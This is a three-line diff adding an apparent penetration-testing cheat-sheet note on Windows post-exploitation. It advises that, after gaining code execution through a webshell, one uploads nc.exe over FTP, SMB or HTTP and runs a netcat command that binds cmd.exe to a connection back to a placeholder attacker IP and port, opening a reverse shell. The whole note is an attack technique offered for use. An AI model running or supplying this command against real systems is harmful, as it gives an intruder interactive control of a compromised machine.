@@ -1,0 +1,3 @@
+# If we have RCE over a machine through a non-stable shell, like webshell, one of the things we can try if none other work, is to upload nc.exe binary through FTP, SMB or HTTP and the use the following command.
+
+.\nc.exe -e cmd.exe <IP> <PORT>
